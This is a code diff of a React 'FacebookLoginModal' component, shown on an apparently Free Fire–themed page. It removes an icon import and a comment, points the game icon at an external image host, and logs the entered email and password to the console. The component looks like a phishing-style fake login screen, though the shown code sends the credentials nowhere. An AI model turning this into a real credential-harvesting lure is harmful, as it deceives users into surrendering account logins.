@@ -1,7 +1,7 @@
 import { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
-import { X, Eye, EyeOff } from 'lucide-react';
+import { X } from 'lucide-react';
 
 interface FacebookLoginModalProps {
   isOpen: boolean;
@@ -22,7 +22,6 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   };
 
   const handleLogin = () => {
-    // Handle login logic here
     console.log('Login attempted with:', { email, password });
     onClose();
   };
@@ -54,7 +53,7 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
           {/* Game Icon */}
           <div className="w-20 h-20 mx-auto mb-4 rounded-full overflow-hidden">
             <img 
-              src="/lovable-uploads/ccce1285-6162-48f7-b840-6c603fceeb9c.png"
+              src="https://i.ibb.co/DDmn9rp/unnamed.webp"
               alt="FREE FIRE"
               className="w-full h-full object-cover"
             />
@@ -138,3 +137,4 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
 };
 
 export default FacebookLoginModal;
+    
